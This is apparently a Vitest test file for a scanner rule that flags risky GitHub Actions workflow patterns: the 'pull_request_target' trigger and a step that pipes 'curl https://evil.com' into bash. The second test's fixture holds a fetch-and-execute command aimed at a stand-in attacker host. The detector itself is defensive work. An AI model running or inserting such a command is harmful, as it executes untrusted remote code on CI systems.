import { describe, it, expect } from "vitest";
import { githubActionsRule } from "../src/rules/github-actions";

describe("GitHub Actions Rule", () => {
  it("detects pull_request_target", () => {
    const input = {
      filePath: ".github/workflows/deploy.yml",
      content: "on: pull_request_target",
      lines: ["on: pull_request_target"]
    };
    
    const findings = githubActionsRule.scan(input);
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe("actions.pull_request_target");
  });

  it("detects curl | bash", () => {
    const input = {
      filePath: ".github/workflows/deploy.yml",
      content: "run: curl https://evil.com | bash",
      lines: ["run: curl https://evil.com | bash"]
    };
    
    const findings = githubActionsRule.scan(input);
    expect(findings.length).toBe(1);
    expect(findings[0].ruleId).toBe("actions.curl_pipe_bash");
  });
});
